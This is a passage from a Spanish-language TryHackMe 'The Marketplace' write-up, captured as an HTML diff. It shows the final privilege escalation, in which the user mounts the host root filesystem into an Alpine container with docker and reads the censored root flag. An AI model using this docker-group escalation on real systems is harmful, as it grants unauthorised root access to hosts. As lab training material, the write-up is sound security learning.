+mysql                        latest              0d64f46acfd1        12 months ago       544MB
+alpine                       latest              a24bb4013296        14 months ago       5.57MB
+</code></pre></div></div>
+
+<p>y usamos alpine para crear una montura de la raiz en mnt para poder visualizar la flag root.txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>michael@the-marketplace:/opt/backups<span class="nv">$ </span>docker run <span class="nt">--rm</span> <span class="nt">-it</span> <span class="nt">--network</span> bridge <span class="nt">-v</span> /:/mnt <span class="nt">--name</span> rooted alpine sh
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/ <span class="c"># whoami</span>
+root
+</code></pre></div></div>
+<p>Ahora vemos que estamos en un contenedor como el usuario root en donde podemos meternos en mnt, luego en el directorio root y leer la flag</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/ <span class="c"># cd /mnt/root</span>
+/mnt/root <span class="c"># cat root.txt</span>
+THM<span class="o">{</span>&lt;<span class="k">***</span>CENSORED<span class="k">***</span><span class="o">&gt;}</span>
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#bash-scripting" class="page__taxonomy-item" rel="tag">bash scripting</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#csrf" class="page__taxonomy-item" rel="tag">csrf</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#docker" class="page__taxonomy-item" rel="tag">docker</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">sqli</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#xss" class="page__taxonomy-item" rel="tag">xss</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#scripting" class="page__taxonomy-item" rel="tag">scripting</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#tryhackme" class="page__taxonomy-item" rel="tag">tryhackme</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-08-17T00:00:00-05:00">August 17, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="#" class="pagination--pager disabled">Previous</a>
+    
+    
+      <a href="/thm-for-business-reasons/" class="pagination--pager" title="For Business Reasons - Try Hack Me
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 Invertebrado</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
